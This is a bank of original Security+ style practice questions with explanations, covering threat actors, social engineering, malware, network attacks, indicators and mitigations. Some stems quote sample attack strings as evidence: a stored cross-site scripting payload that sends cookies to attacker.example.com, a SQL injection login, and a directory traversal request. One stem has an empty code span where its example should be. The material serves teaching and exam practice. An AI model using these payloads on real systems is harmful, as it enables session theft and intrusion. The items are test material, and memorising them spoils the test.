title: Threats, Vulnerabilities, and Mitigations
note: Original practice questions written in the style of the CompTIA Security+ SY0-701 exam. Not real exam questions.

questions.stem: Over 18 months, a defense contractor's network was quietly accessed using custom malware and previously unknown exploits. The attackers took weapons design files and made no demands. Which of the following threat actors is MOST likely responsible?
questions.explanation: Long-term covert access, custom tools and zero-day exploits against military targets point to the funding and sophistication of a nation-state. Organized crime is also well resourced, but it normally seeks a quick financial return such as a ransom or the sale of data.

questions.stem: Hours after a retailer announced it would stop selling a controversial product line, its public website was defaced with political slogans and a group claimed credit on social media. Which of the following threat actors is MOST likely responsible?
questions.explanation: Hacktivists attack to promote a cause and usually claim credit publicly, often through defacement. A nation-state would rarely announce itself or choose such a visible, low-value action.

questions.stem: A security analyst sees noisy scans and exploit attempts from a residential IP address. The traffic matches a popular point-and-click attack tool run with its default settings, and none of the exploits fit the company's systems. Which of the following BEST describes this threat actor?
questions.explanation: An unskilled attacker relies on ready-made tools without understanding them, which produces noisy, poorly targeted activity. A hacktivist would have a cause and would normally pick targets and messages that serve it.

questions.stem: To share large files with a vendor, a marketing team signed up for an unapproved cloud storage service using a corporate credit card. The IT department did not know the service was in use until an audit found it. Which of the following does this BEST describe?
questions.explanation: Shadow IT is technology that staff adopt without IT approval, usually to get work done rather than to cause harm. An insider threat implies an insider who knowingly or carelessly misuses their access to harm the organization, which is not what happened here.

questions.stem: The night after a system administrator was fired, someone used that administrator's still-active account to delete the company's backup sets. Nothing was taken and no demand was made. Which of the following motivations is MOST likely?
questions.explanation: Destroying data right after being fired, with no theft or demand, points to revenge by a disgruntled former insider. Financial gain would normally involve stolen data or a ransom demand.

questions.stem: A hospital's files were encrypted. The attackers demanded payment in cryptocurrency, offered a support portal to help the hospital pay, and have hit dozens of similar organizations this year. Which of the following threat actors is MOST likely responsible?
questions.explanation: Organized crime groups run ransomware as a business, with support portals and repeated campaigns, all for financial gain. A nation-state is driven mainly by espionage or disruption, not by collecting ransoms from many victims.

questions.stem: Which of the following attributes BEST distinguishes an insider threat from most other threat actors?
choices: It has the most funding and resources
It already has authorized internal access
It is driven only by political beliefs
It depends on freely available tools
questions.answer: It already has authorized internal access
questions.explanation: An insider threat is defined by being internal, with legitimate access that bypasses perimeter controls. The most funding and resources describes a nation-state, not an insider.

questions.stem: An attacker stole a company executive's private emails and messaged the executive saying the emails would be published unless the executive approved a fake vendor invoice. Which of the following motivations BEST describes this attack?
questions.explanation: Threatening to expose information unless the victim does what the attacker wants is blackmail. Data exfiltration was how the attacker got the emails, but the motivation is the threat that follows.

questions.stem: An independent researcher finds a flaw in a company's mobile app, reports it through the company's bug bounty program and does not access any customer data. Which of the following motivations BEST describes the researcher?
questions.explanation: Disclosing a flaw responsibly so that it can be fixed, without exploiting it, is an ethical motivation. Disruption/chaos would mean deliberately causing outages or damage, which the researcher avoided.

questions.stem: During an armed conflict between two countries, attackers disabled one country's power grid and communications at the same time as military strikes began. Which of the following motivations is MOST likely?
questions.explanation: Cyberattacks timed to support military operations against critical infrastructure are motivated by war. Philosophical beliefs drive hacktivists, who do not coordinate attacks with military strikes.

questions.stem: An attacker kept undetected access to a foreign ministry's email server for months and copied diplomatic correspondence, but never changed or deleted anything. Which of the following motivations is MOST likely?
questions.explanation: Quietly collecting sensitive government communications over a long period is espionage. Service disruption would mean degrading availability, but the attacker deliberately left everything working to stay hidden.

questions.stem: An environmental group broke into a mining company's file server and gave internal documents about pollution to journalists. The group did not ask for money and said it wanted the public to know. Which of the following motivations BEST describes this attack?
questions.explanation: Leaking documents to advance a cause, with no payment sought, is motivated by philosophical/political beliefs. Espionage is secret intelligence gathering for a sponsor, whereas this group published what it took.

questions.stem: Several employees received text messages saying a package could not be delivered, with a link to "reschedule" that asks for their corporate login. Which of the following types of attacks is this?
questions.explanation: Smishing is phishing delivered by SMS text message. Vishing uses voice calls, not text messages.

questions.stem: A user got a phone call from someone claiming to be on the help desk. The caller said the account would be locked unless the user read back the MFA code just sent to their phone. Which of the following BEST describes this attack?
questions.explanation: Vishing is social engineering carried out over a voice call, here combined with impersonation of the help desk. Smishing would arrive as a text message, not as a phone call asking for the code.

questions.stem: The accounts payable team received an email from the CFO's real mailbox telling them to change a supplier's bank details before today's payment run. Later analysis showed that an attacker had logged in to the CFO's account. Which of the following BEST describes this attack?
questions.explanation: Business email compromise uses a real, compromised business mailbox to trick staff into actions such as fraudulent payments. Typosquatting relies on a look-alike domain, but this email came from the CFO's genuine account.

questions.stem: Attackers who wanted to breach several regional utility companies compromised an industry association forum that engineers at those utilities read every day, and used it to deliver malware. Which of the following types of attacks is this?
questions.explanation: A watering hole attack compromises a legitimate site that the target group is known to visit. Typosquatting would mean registering a misspelled domain and waiting for users to mistype it, which is not what happened here.

questions.stem: A company owns example.com. An analyst finds that someone has registered exmaple.com and set up a copy of the company's login page there to catch users who mistype the address. Which of the following BEST describes this technique?
questions.explanation: Typosquatting registers a domain that differs from the real one by a common typing mistake. DNS poisoning would redirect users who typed the correct name, but these users reach the fake site only by mistyping it.

questions.stem: A caller told the payroll clerk that he was from an external audit firm hired by the board and that a confidential review was due tomorrow. He used this story to ask for a list of employees and their salaries. Which of the following techniques did the caller use?
questions.explanation: Pretexting is inventing a believable scenario to justify an unusual request. Shoulder surfing gathers information by watching someone's screen or keyboard, and it does not involve persuading the victim.

questions.stem: A competitor spread a fake press release on social media claiming a company's product had been recalled for safety reasons. The competitor knew the claim was false. Which of the following BEST describes this activity?
questions.explanation: Disinformation is false information spread on purpose to deceive. Misinformation is also false, but it is spread by people who believe it is true, which does not fit someone who knew the claim was false.

questions.stem: Customers report a social media account and a website on an unrelated domain that use a bank's logo, colors and slogans. Both offer "account verification" and collect online banking details. Which of the following BEST describes this attack?
questions.explanation: Brand impersonation copies a trusted organization's branding to make a fake presence look genuine. Typosquatting depends on a misspelling of the real domain, but this site uses an unrelated domain.

questions.stem: A spam filter keeps missing a phishing campaign. Each email has no body text, only a single picture showing the fake invoice message and a payment address. Which of the following threat vectors is being used?
questions.explanation: Putting the lure inside a picture is an image-based vector, used because text filters cannot read words in an image. A file-based vector would deliver a malicious document or executable, not just a picture of text.

questions.stem: An attacker with access to a shared network drive replaced a commonly used spreadsheet template with a copy containing a malicious macro. Several users opened the template the next day. Which of the following threat vectors does this BEST represent?
questions.explanation: The malicious code arrived inside a document that users opened, so this is a file-based vector. It is not message-based because no email, SMS or instant message delivered the file.

questions.stem: Several USB flash drives labeled "Q3 Layoffs" were found in a company's parking lot. One employee plugged a drive into a work laptop, and the endpoint software then alerted on a hidden executable. Which of the following threat vectors was used?
questions.explanation: Leaving USB drives where curious staff will find them uses removable devices as the threat vector. The drive did hold a malicious file, but what defines this attack is the device that delivered it.

questions.stem: A remote code execution flaw is announced in the VPN software installed on every company laptop. The flaw can be exploited only on devices where that software is installed. Which of the following BEST describes this attack surface?
questions.explanation: Software installed on the endpoint is client-based, so every laptop running the vulnerable VPN software is exposed. Agentless software runs without anything installed locally, such as a browser-based portal, which is not the case here.

questions.stem: A vulnerability scan flags a file server that runs an operating system the vendor stopped supporting two years ago. The newest vulnerabilities on it have no patches available. Which of the following threat vectors does this server represent?
questions.explanation: A system that no longer gets vendor patches is an unsupported system, and its known vulnerabilities will never be fixed. Open service ports may also exist on the server, but the issue described is the missing vendor support.

questions.stem: A penetration tester logged in to the management page of several IP cameras using the username admin and the password admin printed in the manufacturer's manual. Which of the following attack surfaces did the tester exploit?
questions.explanation: Credentials that ship from the manufacturer and are never changed are default credentials, and anyone can find them in the manual. The management port had to be open, but it was the unchanged password that allowed the login.

questions.stem: An external scan of a web server shows the following: `21/tcp open ftp, 23/tcp open telnet, 443/tcp open https`. Only HTTPS is needed for the server's role. Which of the following attack surfaces does the scan reveal?
questions.explanation: FTP and Telnet are listening but not needed, so they are unnecessary open service ports that add attack surface. The scan does not show whether default credentials are in use.

questions.stem: Attackers broke into a managed service provider's remote monitoring platform and used it to push ransomware to the networks of dozens of the provider's customers. Which of the following threat vectors BEST describes how the customers were compromised?
questions.explanation: Reaching customers through a trusted MSP's tools is a supply chain attack. A watering hole compromises a website that targets visit, but here the attackers used the provider's management access.

questions.stem: A developer finds that an application copies user input into a fixed 64-byte array without checking its length. Long input crashes the program and can overwrite the return address on the stack. Which of the following vulnerabilities is this?
questions.explanation: Writing more data than a fixed buffer can hold, so that it overwrites nearby memory such as a return address, is a buffer overflow. Memory injection places code into the memory of another running process, which is a different technique.

questions.stem: A privileged program checks that a user may write to a temporary file and then opens the file a few milliseconds later. An attacker replaces the file with a link to a system file between the check and the open. Which of the following vulnerabilities is being exploited?
questions.explanation: A TOC/TOU race condition happens when the resource changes between the moment it is checked and the moment it is used. A buffer overflow means writing past a memory boundary, and nothing like that happens here.

questions.stem: An endpoint detection tool alerts that a malicious DLL was loaded into the address space of a running, legitimate explorer.exe process so that the attacker's code runs under that process's identity. Which of the following BEST describes this vulnerability?
questions.explanation: Memory injection inserts code into the memory of a legitimate running process so that it runs hidden inside that process. A buffer overflow overruns a buffer within the same program and does not load code into another process, and a malicious update arrives through a vendor's update channel rather than being injected into a running process.

questions.stem: Attackers compromised a software vendor's build server. The vendor's next routine update was signed with its real certificate, but it installed a backdoor on customers' systems. Which of the following BEST describes this vulnerability?
questions.explanation: A malicious update is a legitimate-looking, properly signed update that carries harmful code. Side loading means installing software from outside the official channel, but this update came through the vendor's normal update process.

questions.stem: A web server log shows this login request: `POST /login user=admin' OR '1'='1' -- &pass=x`. The attacker was then logged in as the first account in the database. Which of the following vulnerabilities was exploited?
questions.explanation: The input closes the SQL string and adds a condition that is always true, so the database returns a match without a valid password. That is SQL injection. Cross-site scripting injects script into pages that other users' browsers run, not queries that the server runs.

questions.stem: A user posted this comment on a support forum: `<script>new Image().src='https://attacker.example.com/c?'+document.cookie</script>`. Every visitor who views the thread now sends their session cookie to the attacker. Which of the following vulnerabilities does the forum have?
questions.explanation: The forum stores the script and serves it to visitors without encoding it, which is stored cross-site scripting. Cross-site request forgery makes a logged-in browser send unwanted requests, but it does not run attacker script to steal cookies.

questions.stem: Malware on a workstation survived a full disk wipe and operating system reinstall. Investigators found that it had been written into the motherboard's UEFI. Which of the following types of vulnerabilities did the attacker exploit?
questions.explanation: Malware stored in UEFI lives in hardware firmware, so wiping the disk and reinstalling the operating system does not remove it. An operating system vulnerability would be removed by a clean reinstall.

questions.stem: A network switch vendor has announced that after this month it will no longer sell, support or release security patches for a model the company still uses at 40 sites. Which of the following BEST describes the status of these switches?
questions.explanation: End-of-life is the vendor's formal end of sales, support and patches for a product. Legacy describes old technology that an organization keeps running, but the key fact here is the vendor's announced end of support.

questions.stem: On a shared virtualization host, code running in one guest virtual machine broke out of its guest and got access to the hypervisor and the other guests on the same host. Which of the following vulnerabilities was exploited?
questions.explanation: VM escape means breaking out of a guest to reach the hypervisor or other guests. Resource reuse means data left behind in reassigned memory or storage, and it does not give control over the host.

questions.stem: A cloud customer launches a new virtual machine and finds fragments of another tenant's database records in the disk space allocated to it. Which of the following vulnerabilities does this BEST describe?
questions.explanation: Resource reuse happens when memory or storage is given to a new tenant without first being cleared, so earlier data stays readable. VM escape would require breaking out of the guest, but this customer only read space that was given to it.

questions.stem: A researcher downloads thousands of customer invoices from a company's cloud object storage bucket without logging in. The bucket's access policy grants read access to everyone. Which of the following is the MOST likely cause?
questions.explanation: A bucket policy that grants public read access is a misconfiguration, which is a common cloud-specific vulnerability. A zero-day is an unknown software flaw, but here the platform worked exactly as it was configured.

questions.stem: A company found that network appliances bought through an unauthorized reseller had extra components on the circuit board that send traffic to an outside address. Which of the following supply chain risks does this represent?
questions.explanation: The compromise is in the physical device as it was supplied, which is a hardware provider supply chain risk. A software provider risk involves tampered code or updates, not added circuit board components.

questions.stem: A code review finds that an application encrypts stored credit card numbers with a cipher the developer designed, and the key is written directly in the source code. Which of the following types of vulnerabilities is this?
questions.explanation: A home-made cipher and a key written into the code are cryptographic weaknesses that make the encryption easy to break. Misconfiguration refers to insecure settings, but here the encryption design itself is flawed.

questions.stem: An employee downloaded an Android app package from a website and installed it on a company phone. The app is not available in the official app store, and the phone's operating system was not modified. Which of the following BEST describes what the employee did?
questions.explanation: Side loading is installing an app from outside the official store. Jailbreaking removes the operating system's built-in restrictions, but the employee did not modify the operating system.

questions.stem: MDM reports that an employee's iPhone is out of compliance. The employee ran a tool that exploited iOS to get root-level access and remove Apple's restrictions on the device. Which of the following BEST describes this?
questions.explanation: Jailbreaking exploits iOS to remove manufacturer restrictions and get root-level access. Side loading only installs apps from outside the store, and on iOS jailbreaking is often what makes it possible in the first place.

questions.stem: Which of the following BEST describes a vulnerability that attackers are exploiting before the vendor knows about it or has released a patch?
questions.explanation: A zero-day vulnerability is exploited before the vendor knows about it or has a fix ready. End-of-life systems also go without patches, but that is because the vendor has stopped supporting them.

questions.stem: Users report that files on a shared drive now end in .locked and will not open. A file named RESTORE-FILES.txt in every folder asks for payment in cryptocurrency. Which of the following types of malware is MOST likely involved?
questions.explanation: Encrypted files with changed extensions and a payment note are clear signs of ransomware. A logic bomb stays hidden until a trigger condition is met and then runs a harmful action, but it does not demand payment to restore files.

questions.stem: A user installed a free PDF converter from a download site. The converter works normally, but the firewall now shows the laptop keeping a connection open to 198.51.100.44 on port 4444. Which of the following types of malware is this?
questions.explanation: A Trojan looks like useful software while running a hidden malicious payload, here a remote connection to the attacker. A worm spreads by itself across the network, but this program needed the user to install it.

questions.stem: Within 20 minutes, hundreds of unpatched servers on different subnets began scanning port 445 and infecting each other. No users opened attachments or ran programs. Network utilization reached 95%. Which of the following types of malware is MOST likely involved?
questions.explanation: A worm spreads by itself through a network vulnerability without user action, which causes fast spread and high resource consumption. A virus needs a user to run an infected file or program to spread.

questions.stem: During a code review, an analyst finds a script added by a developer that deletes the payroll database if the developer's account is ever removed from the HR system. Which of the following BEST describes this script?
questions.explanation: A logic bomb is code that runs a harmful action when a set condition is met, here the developer's account being removed. A Trojan pretends to be legitimate software that a user installs, but this is hidden code with a trigger condition.

questions.stem: Traffic is leaving a server for an unknown host, but Task Manager and the endpoint antivirus show no unusual processes. An offline scan from bootable media finds a modified kernel driver that hides files and processes. Which of the following is MOST likely installed?
questions.explanation: A rootkit changes the operating system, often at the kernel level, to hide itself from normal tools, which is why only an offline scan found it. Spyware collects information but does not usually hide itself at the kernel level.

questions.stem: During a physical security sweep, a technician finds a small USB adapter between a shared workstation's keyboard cable and the computer. Several users of that workstation have since had their accounts compromised. Which of the following was MOST likely used?
questions.explanation: An inline USB device between the keyboard and the computer is a hardware keylogger, which records every key pressed, including passwords. Spyware is software installed on the system, but this was a physical device.

questions.stem: An employee's badge was used to open the server room at 2:14 AM while the employee was at home with the badge. Earlier that week, a stranger stood very close to the employee in a crowded elevator holding a bag. Which of the following attacks MOST likely occurred?
questions.explanation: Copying a proximity badge's signal from close range with a hidden reader is RFID cloning, which explains the badge being used while the real card stayed with the employee. Tailgating means following someone through a door and would not create a badge log entry.

questions.stem: Servers in a data center shut down after overheating. Investigators found that someone had logged in to the building's HVAC controller remotely and changed the cooling setpoint for the server room. Which of the following types of attacks does this BEST describe?
questions.explanation: Attacking the environmental systems that equipment depends on, such as cooling, power or fire suppression, is an environmental attack. Brute force in a physical context means forcing a door, lock or barrier.

questions.stem: A web server's link is saturated by 4,000-byte DNS responses from thousands of open resolvers. The server never sent any DNS queries. The attacker sent small queries to the resolvers with the server's IP address as the spoofed source. Which of the following attacks is this?
questions.explanation: Small spoofed queries that produce large responses aimed at the victim are an amplified (and reflected) DDoS. DNS poisoning changes name resolution answers, but here the goal is to flood the link.

questions.stem: Only users on the corporate network are sent to 198.51.100.23 when they browse to portal.example.com. The authoritative DNS records still show the correct address, 203.0.113.10, and users on other networks are not affected. Which of the following is the MOST likely cause?
questions.explanation: When the authoritative records are correct but one resolver's users get a bad answer, that resolver's cache has been poisoned. Domain hijacking would change the registration or authoritative records and affect users everywhere.

questions.stem: Users in the lobby report certificate warnings after connecting to the CorpGuest network. A wireless survey finds two access points broadcasting CorpGuest, one of them an unknown device with a much stronger signal. Which of the following attacks is MOST likely taking place?
questions.explanation: An evil twin copies the SSID of a legitimate network to lure users into connecting so their traffic can be intercepted. A rogue access point is any unauthorized AP, but it does not have to copy an existing network's name, so evil twin is the more precise answer.

questions.stem: An analyst reviews the ARP table on a workstation and sees: `10.0.0.1 at 00:1a:2b:3c:4d:5e` and `10.0.0.25 at 00:1a:2b:3c:4d:5e`. The address 10.0.0.1 is the default gateway, and 10.0.0.25 is another user's workstation. Which of the following attacks is MOST likely being used to gain an on-path position?
questions.explanation: The gateway's IP address resolving to another workstation's MAC address shows ARP poisoning, which sends traffic through the attacker. MAC flooding overloads a switch's address table and does not change workstation ARP entries.

questions.stem: After a workstation was compromised, the attacker used the password hash taken from its memory to log in to three file servers without ever cracking the password. Which of the following attacks does this BEST describe?
questions.explanation: Reusing a captured hash or token to authenticate, as in pass-the-hash, is credential replay. Brute force tries to guess the password itself, which the attacker never needed to do.

questions.stem: A web server log contains: `GET /download?file=../../../../etc/passwd HTTP/1.1 200`. Which of the following attacks does this log entry show?
questions.explanation: The ../ sequences move up out of the web root to read a system file, which is directory traversal. SQL injection would put SQL syntax such as quotes or OR clauses in the parameter.

questions.stem: A security analyst sees the following events with no matching change request: `Event 4732: Member jdoe added to group Administrators. Subject: jdoe`. The user jdoe is a standard user and had run an exploit against a local service minutes earlier. Which of the following attacks MOST likely occurred?
questions.explanation: A standard user who exploits a local service and then adds themselves to Administrators has escalated privileges. Credential replay would mean logging in with someone else's captured credentials, but jdoe used their own account.

questions.stem: While logged in to an online banking site, a user visited a forum page containing ``. The bank then processed a transfer the user never asked for. Which of the following attacks is this?
questions.explanation: The forum page made the user's authenticated browser send a request to the bank, which is cross-site request forgery. Cross-site scripting would require script to run in the bank site's own pages, which did not happen.

questions.stem: An intrusion detection system alerts that a client and a web server that both support TLS 1.3 have just negotiated SSL 3.0. A device on the path had changed the handshake messages. Which of the following attacks is MOST likely taking place?
questions.explanation: A downgrade attack changes the negotiation so that both sides fall back to an older, weaker protocol that the attacker can break. A replay attack resends captured traffic and does not change which protocol version is chosen.

questions.stem: Which of the following attacks relies on the high chance that two different inputs will produce the same hash value, which means far fewer attempts are needed than the hash length suggests?
questions.explanation: A birthday attack uses the birthday paradox to find hash collisions in about the square root of the attempts that brute force would need. A rainbow table looks up precomputed hashes to recover passwords, not to find two inputs with the same hash.

questions.stem: Authentication logs show one failed login each for 350 different user accounts within an hour, all from 203.0.113.50 and all using the password Winter2026!. No accounts were locked out. Which of the following attacks is MOST likely taking place?
questions.explanation: Trying one common password against many accounts, slowly enough to avoid lockouts, is password spraying. Brute force tries many passwords against one account, which would quickly trigger a lockout.

questions.stem: The help desk reports that the admin account is locked out. The log shows: `Failed login for admin from 203.0.113.7 (x40 in 1 minute)`, followed by `Account admin locked`. Which of the following attacks is MOST likely taking place?
questions.explanation: Many rapid failed attempts against one account from one source are a brute force attack, and the account lockout is the indicator. Password spraying spreads a few attempts across many accounts to avoid exactly this kind of lockout.

questions.stem: A user's account logged in from Chicago at 09:02 and logged out at 09:10. It then logged in from Singapore at 09:20. The user says they are in Chicago and did not use a VPN. Which of the following indicators does this BEST describe?
questions.explanation: No one can travel from Chicago to Singapore in ten minutes, so this is impossible travel. Concurrent session usage would require both sessions to be active at once, but the Chicago session had ended first.

questions.stem: While investigating a suspected intrusion, an analyst finds that a domain controller's security log has no entries between 01:00 and 03:00, and the first entry after the gap is `Event 1102: The audit log was cleared`. Which of the following indicators does this BEST describe?
questions.explanation: A gap in the log followed by a log-cleared event shows missing logs, a sign that an attacker tried to hide their activity. Out-of-cycle logging means entries appearing at unusual times, not entries that have disappeared.

questions.stem: A retailer wants its point-of-sale terminals to keep communicating with the payment processor, but it wants to stop them from reaching corporate workstations if one is compromised. Which of the following techniques BEST meets this goal?
questions.explanation: Segmentation puts the terminals in their own network zone with controlled paths, so the traffic they need still flows while lateral movement is limited. Isolation would cut the terminals off completely, which would stop payments.

questions.stem: During an incident, a technician moves an infected workstation to a quarantine VLAN that cannot reach any other network, so it can be analyzed without spreading malware. Which of the following mitigation techniques is being used?
questions.explanation: Isolation fully separates a system so that it cannot talk to anything else, which is what a quarantine VLAN with no routes does. Segmentation divides a network into zones that can still talk to each other in controlled ways.

questions.stem: A company's lobby kiosks must run only the check-in application and the browser. Every other executable, including any malware a visitor brings in, should be blocked from running. Which of the following BEST meets this requirement?
questions.explanation: An application allow list lets only approved programs run and blocks everything else by default. A host-based firewall controls network traffic, not which programs can run.

questions.stem: A network engineer adds this rule to a router: `deny tcp any host 10.1.1.20 eq 3389`. Which of the following mitigation techniques is the engineer using?
questions.explanation: A rule that permits or denies traffic by address and port is an access control list entry. An application allow list controls which programs can run on a host, not which traffic a router forwards.

questions.stem: A vendor has released a fix for a remote code execution flaw in the company's web servers, and the flaw is being actively exploited on the internet. Which of the following should the security team do FIRST to mitigate the risk?
questions.explanation: Applying the vendor's fix removes the vulnerability, which is the most direct mitigation when a fix exists. Monitoring would only help detect exploitation, while the flaw would remain open.

questions.stem: An audit finds that all help desk staff are members of Domain Admins, but their job only requires resetting passwords and unlocking accounts. Which of the following mitigation techniques would BEST address this finding?
questions.explanation: Least privilege gives users only the permissions their job needs, so the help desk should get password reset rights, not full domain admin rights. Configuration enforcement keeps system settings at a baseline, which does not fix excessive user permissions.

questions.stem: An organization deploys a tool that checks every server against an approved security baseline every hour and automatically changes back any setting that has drifted from it. Which of the following mitigation techniques does this BEST represent?
questions.explanation: Configuration enforcement keeps systems at a defined baseline by automatically correcting drift. Monitoring would detect and report the drift without fixing it.

questions.stem: Before old database servers are sent to a recycler, the IT team removes them from DNS and the directory, revokes their certificates and securely wipes their drives. Which of the following mitigation techniques is being performed?
questions.explanation: Decommissioning is retiring systems securely, which includes removing their access and records and sanitizing their data before disposal. Isolation separates a system that is still running, but these servers are being retired permanently.

questions.stem: Sales staff often lose laptops while traveling. The company wants to make sure that a thief who removes the hard drive cannot read the data stored on it. Which of the following hardening techniques BEST meets this goal?
questions.explanation: Full-disk encryption makes the data on the drive unreadable without the key, even when the drive is removed. A host-based firewall protects a running system from network attacks and does nothing for data at rest on a stolen drive.

questions.stem: A security engineer wants software on each server that detects suspicious behavior, such as unauthorized changes to system files or the registry, and blocks it automatically. Which of the following should the engineer install?
questions.explanation: A host-based intrusion prevention system (HIPS) detects malicious activity on the host and blocks it. A HIDS gives the same visibility but only raises alerts, so it does not meet the requirement to block automatically.

questions.stem: Employees often connect their laptops to hotel and airport Wi-Fi. The security team wants each laptop to block unsolicited inbound connections from other devices on whatever network it joins. Which of the following BEST meets this requirement?
questions.explanation: A host-based firewall filters traffic on the laptop itself, so it protects the device on any network. A network access control list is enforced on network devices the company controls, which the hotel and airport networks are not.

questions.stem: An unknown device was found plugged into a network jack in an unused conference room, where it had received an IP address on the corporate network. Which of the following hardening techniques would BEST prevent this in the future?
questions.explanation: Disabling switch ports that are not in use stops anyone from simply plugging a device into an empty jack. A host-based firewall protects the host it is installed on and cannot stop an outside device from joining the network.

questions.stem: Facilities is installing new network-connected HVAC controllers that cannot run endpoint security agents. Each controller ships with the same administrator login printed in its manual. Which of the following should be done FIRST before connecting the controllers to the network?
questions.explanation: Default credentials are public, so they must be changed before a device goes on the network. Endpoint protection is not an option because the controllers cannot run agents, and it would not fix the known shared password anyway.

questions.stem: A new server image includes media players, games and developer tools that the server's role does not need. The security team wants to reduce the image's attack surface before deploying it. Which of the following hardening techniques BEST meets this goal?
questions.explanation: Removing software that the role does not need gets rid of the code that could be vulnerable, which directly reduces attack surface. A host-based firewall limits network access to services, but the unneeded programs and their flaws would still be on the server.
